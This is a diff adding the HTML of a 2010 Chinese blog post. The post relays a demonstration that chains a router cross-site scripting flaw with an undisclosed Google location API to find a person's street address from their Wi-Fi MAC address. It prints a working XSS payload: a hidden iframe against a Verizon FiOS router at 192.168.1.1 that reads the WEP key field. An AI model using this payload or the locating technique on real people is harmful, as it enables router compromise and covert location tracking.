@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html">
+  <head>
+    <title>Google的未公开API：wifi的MAC地址转经纬街道 - Est's Blog</title>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+
+    <meta charset="utf-8" />
+    <link href="https://feeds.feedburner.com/initiative" type="application/rss+xml" rel="alternate" title="Est's Blog RSS Feed" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Google的未公开API：wifi的MAC地址转经纬街道" />
+
+
+
+
+    <link rel="stylesheet" href="/theme/css/normalize.min.css" />
+    <link rel="stylesheet" href="/theme/css/style.css" />
+
+
+    <style>
+      body {
+        background: #ecedef url("/theme/img/ignasi_pattern_s.png") repeat;
+      }
+    </style>
+  </head>
+  <body class="single-body">
+<nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="/" class="nav-text">
+    Est's Blog
+  </a></h1>
+  <div class="hamburger-menu">
+    <button onclick="hamburgerMenuPressed.call(this)" aria-haspopup="true" aria-expanded="false" aria-controls="menu" aria-label="Menu">
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="/" class="hamburger-menu-overlay-link">Home</a></li>
+
+        <li><a href="/category/archive.html" class="hamburger-menu-overlay-link active">archive</a></li>
+        <li><a href="/category/stderr.html" class="hamburger-menu-overlay-link">stderr</a></li>
+        <li><a href="/category/stdin.html" class="hamburger-menu-overlay-link">stdin</a></li>
+        <li><a href="/category/stdout.html" class="hamburger-menu-overlay-link">stdout</a></li>
+
+    </ul>
+  </div>
+</nav>    <main class="content side-text-padding">
+
+
+<article class="post">
+  <header class="post-header">
+    <h2 class="post-title">Google的未公开API：wifi的MAC地址转经纬街道</h2>
+    <p class="post-date">Posted <time datetime="2010-10-04T14:52:26+00:00">2010-10-04</time> | <span>archive</span></p>
+  </header>
+
+  
+  <p>跨省追捕专用API啊。。。。</p>
+
+<p>演示地址：<a href="http://www.samy.pl/mapxss/">http://www.samy.pl/mapxss/</a></p>
+
+<p>先诱惑目标访问一个XSS，跨了wifi包含mac地址的一个页面（当然是跨默认密码），比如原作者发现的Verizon FiOS Router的XSS：</p>
+
+<pre><code>&lt;iframe style=&quot;display:none&quot; src=&quot;http://192.168.1.1/index.cgi?active_page=9098&amp;req_mode=0&amp;mimic_button_field=goto%3a+9098..&amp;button_value=9098&amp;ssid=samy%22%3E%3Cscript%3Ealert%28document.body.innerHTML.substr%28document.body.innerHTML.indexOf%28%27wep_key_edit%22%20v%27%29%2b21,10%29%29;%3C/script%3E&quot;&gt;&lt;/iframe&gt; 
+</code></pre>
+
+<p>然后通过ajax获得mac地址并传输到Google Location Services这个未公开API</p>
+
+<p>作者说这个API水他嗅探<a href="http://www.mozilla.com/en-US/firefox/geolocation/">Firefox的Geolocation</a>请求发现的。</p>
+
+<p>还好Google搜集wifi的小车似乎没有在大陆来过？</p>
+
+<p><a href="http://www.reddit.com/r/programming/comments/dmlo6/find_anyones_address_from_their_router_mac_code/">via</a></p>
+
+</article>
+
+
+<div class="comments">
+  <h2>Comments</h2>
+  <div id="disqus_thread"></div>
+  <script type="text/javascript">
+    var disqus_shortname = 'estblog';
+    var disqus_identifier = 'archives/2990';
+    var disqus_url = location.href;
+    (function() {
+    var dsq = document.createElement('script'); 
+
+    dsq.type = 'text/javascript';
+    dsq.defer = true;
+    dsq.src = '//estblog.disqus.com/embed.js';
+    (document.getElementsByTagName('body')[0] || document.getElementsByTagName('head')[0]).appendChild(dsq);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the comments.</noscript>
+</div>    </main>
+<script src="/theme/js/core.js"></script>
+<script type="text/javascript">
+    if(location.protocol === "http:") location.protocol = "https:"
+</script>
+
+  </body>
+
+</html>
